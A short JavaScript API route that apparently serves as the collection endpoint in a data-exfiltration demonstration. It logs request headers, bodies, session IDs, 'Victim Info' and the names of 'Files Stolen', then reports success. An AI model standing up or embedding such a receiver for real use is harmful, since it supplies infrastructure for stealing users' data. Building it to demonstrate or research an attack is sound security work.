export default function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Log the incoming request details
  console.log('🎯 DATA EXFILTRATION DETECTED!');
  console.log('Timestamp:', new Date().toISOString());
  console.log('Headers:', req.headers);
  console.log('Body:', req.body);
  
  // Extract key information
  const data = req.body;
  if (data) {
    console.log('Session ID:', data.session_id);
    console.log('Victim Info:', data.metadata);
    console.log('Files Stolen:', Object.keys(data.files || {}));
  }

  // Return success response
  res.status(200).json({ 
    status: 'success',
    message: 'Data received successfully',
    timestamp: new Date().toISOString()
  });
} 